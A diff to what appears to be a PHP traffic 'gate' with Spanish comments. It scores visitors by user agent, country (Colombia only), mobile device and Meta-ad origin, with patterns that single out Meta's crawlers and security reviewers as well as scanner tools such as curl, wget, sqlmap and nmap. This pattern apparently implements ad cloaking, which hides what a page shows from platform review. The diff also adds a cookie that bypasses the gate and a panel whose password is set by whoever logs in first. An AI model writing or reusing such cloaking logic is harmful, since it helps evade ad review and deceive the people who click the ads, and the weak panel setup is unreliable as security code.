@@ -13,6 +13,10 @@ define('GATE_LIB_LOADED', true);
 function gate_secret() {
     static $cached = null;
     if ($cached !== null) return $cached;
+    // 1) Env var (Heroku, Vercel, etc.) — recomendado en producción
+    $env = getenv('GATE_SECRET');
+    if ($env && strlen(trim($env)) >= 32) { return $cached = trim($env); }
+    // 2) Archivo persistido (fallback para hosting tradicional)
     $f = __DIR__ . '/.gate_secret';
     if (!file_exists($f) || filesize($f) < 32) {
         @file_put_contents($f, bin2hex(random_bytes(32)));
@@ -209,7 +213,9 @@ function gate_compute_score($ctx = []) {
 
     // ---------- UA: crawlers conocidos ----------
     if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot|skypeuripreview|slackbot|pinterest|redditbot/i', $ua)) { $score += 10; $reasons[] = 'ua_searchbot'; }
-    if (preg_match('/facebookexternalhit|facebookcatalog|meta-externalagent|meta-link-preview|fb_iab|fbiab|fbios|fban|instagram|igsecurity|igprivacy|meta.*crawler|facebook.*bot|fb.*preview/i', $ua)) { $score += 15; $reasons[] = 'ua_meta'; }
+    // SOLO crawlers/scrapers de Meta. NO incluye FBAN/FBIOS/FBAV/FB_IAB/Instagram
+    // (esos son in-app browsers de USUARIOS REALES, no crawlers).
+    if (preg_match('/facebookexternalhit|facebookcatalog|meta-externalagent|meta-link-preview|igsecurity|igprivacy|meta.*crawler|facebook.*bot|fb.*preview|metainspector/i', $ua)) { $score += 15; $reasons[] = 'ua_meta_crawler'; }
     if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy|masscan|nikto|sqlmap|nmap|zgrab|httpx/i', $ua)) { $score += 10; $reasons[] = 'ua_generic_bot'; }
     if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver|electron/i', $ua)) { $score += 12; $reasons[] = 'ua_headless'; }
     if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|majestic|blexbot|petalbot|sistrix|seokicks|domainstats|backlinks/i', $ua)) { $score += 10; $reasons[] = 'ua_seo'; }
@@ -220,8 +226,9 @@ function gate_compute_score($ctx = []) {
     if (empty(trim($accept_enc))) { $score += 4; $reasons[] = 'no_accept_enc'; }
     if (empty($accept) || stripos($accept, 'text/html') === false) { $score += 4; $reasons[] = 'no_accept_html'; }
 
-    // ---------- Idioma: requiere español ----------
-    if (!gate_accepts_spanish($accept_lang)) { $score += 10; $reasons[] = 'not_spanish'; }
+    // ---------- Idioma: muy suave (CO con UI en inglés es real) ----------
+    if (empty(trim($accept_lang))) { $score += 4; $reasons[] = 'no_lang'; }
+    elseif (!gate_accepts_spanish($accept_lang)) { $score += 2; $reasons[] = 'lang_not_es'; }
 
     // ---------- Mobile-only ----------
     if (!gate_is_mobile($ua)) { $score += 10; $reasons[] = 'not_mobile'; }
@@ -234,18 +241,120 @@ function gate_compute_score($ctx = []) {
     $country = gate_country($ip);
     if ($country && $country !== 'CO') { $score += 20; $reasons[] = 'geo_not_co:' . $country; }
 
-    // ---------- Origen Meta (fbclid o referer FB/IG) ----------
+    // ---------- Origen Meta: NO requerido (usuarios pueden volver desde marcadores,
+    //            historial, links compartidos por WhatsApp, etc.). Solo cuenta como
+    //            señal SUAVE para detectar tráfico orgánico vs ad.
     if ($require_origin && !gate_meta_origin($referer, $get)) {
-        $score += 10; $reasons[] = 'no_meta_origin';
+        $score += 0; $reasons[] = 'no_meta_origin'; // informativo, no bloquea
     }
 
     return [$score, $reasons];
 }
 
 // ---------------------------------------------------------------
-// Tiene cookie HMAC válida?
+// DEV MODE — controlado desde /panel.php
+// La cookie _dev NO está bound a IP/UA (para que el dueño pueda
+// rotar de WiFi/4G y mantener sesión). Solo HMAC del secreto.
+// ---------------------------------------------------------------
+const DEV_COOKIE = '_dev';
+const DEV_TTL    = 28800; // 8h
+
+function gate_dev_active() {
+    if (empty($_COOKIE[DEV_COOKIE])) return false;
+    $expected = hash_hmac('sha256', 'dev_active', gate_secret());
+    return hash_equals($expected, (string)$_COOKIE[DEV_COOKIE]);
+}
+
+function gate_dev_set($active, $ttl = DEV_TTL) {
+    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+           || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
+    if ($active) {
+        $val = hash_hmac('sha256', 'dev_active', gate_secret());
+        setcookie(DEV_COOKIE, $val, [
+            'expires'  => time() + $ttl,
+            'path'     => '/',
+            'secure'   => $secure,
+            'httponly' => true,
+            'samesite' => 'Lax',
+        ]);
+    } else {
+        setcookie(DEV_COOKIE, '', [
+            'expires'  => time() - 3600,
+            'path'     => '/',
+            'httponly' => true,
+            'samesite' => 'Lax',
+        ]);
+    }
+}
+
+// ---------------------------------------------------------------
+// PANEL — sesión y credenciales
+// La password se setea desde el primer login (auto-setup).
+// Hash bcrypt persistido en .panel_pass (denegado por .htaccess).
+// ---------------------------------------------------------------
+const PANEL_COOKIE   = '_pnl';
+const PANEL_TTL      = 7200; // 2h
+const PANEL_PASSFILE = __DIR__ . '/.panel_pass';
+
+function panel_pass_get() {
+    // 1) Env var (recomendado en Heroku — sobrevive deploys/restarts)
+    $env = getenv('PANEL_PASS_HASH');
+    if ($env && strlen(trim($env)) > 20) return trim($env);
+    // 2) Archivo persistido (fallback)
+    if (file_exists(PANEL_PASSFILE) && filesize(PANEL_PASSFILE) > 20) {
+        return trim((string)@file_get_contents(PANEL_PASSFILE));
+    }
+    return '';
+}
+function panel_pass_exists() {
+    return panel_pass_get() !== '';
+}
+function panel_pass_set($plain) {
+    if (strlen($plain) < 6) return false;
+    $h = password_hash($plain, PASSWORD_BCRYPT);
+    // Si está usando env var, NO sobreescribimos archivo (el env var manda)
+    if (!getenv('PANEL_PASS_HASH')) {
+        @file_put_contents(PANEL_PASSFILE, $h);
+        @chmod(PANEL_PASSFILE, 0600);
+    }
+    return true;
+}
+function panel_pass_verify($plain) {
+    $h = panel_pass_get();
+    return $h && password_verify($plain, $h);
+}
+
+function panel_session_active() {
+    if (empty($_COOKIE[PANEL_COOKIE])) return false;
+    $expected = hash_hmac('sha256', 'panel_v1', gate_secret());
+    return hash_equals($expected, (string)$_COOKIE[PANEL_COOKIE]);
+}
+function panel_session_set($active) {
+    $secure = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off')
+           || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https');
+    if ($active) {
+        setcookie(PANEL_COOKIE, hash_hmac('sha256', 'panel_v1', gate_secret()), [
+            'expires'  => time() + PANEL_TTL,
+            'path'     => '/',
+            'secure'   => $secure,
+            'httponly' => true,
+            'samesite' => 'Lax',
+        ]);
+    } else {
+        setcookie(PANEL_COOKIE, '', [
+            'expires'  => time() - 3600,
+            'path'     => '/',
+            'httponly' => true,
+            'samesite' => 'Lax',
+        ]);
+    }
+}
+
+// ---------------------------------------------------------------
+// Tiene cookie HMAC válida? (gate normal o dev mode activo)
 // ---------------------------------------------------------------
 function gate_has_valid_cookie() {
+    if (gate_dev_active()) return true;
     if (empty($_COOKIE['_qok'])) return false;
     return gate_verify_token(
         $_COOKIE['_qok'],
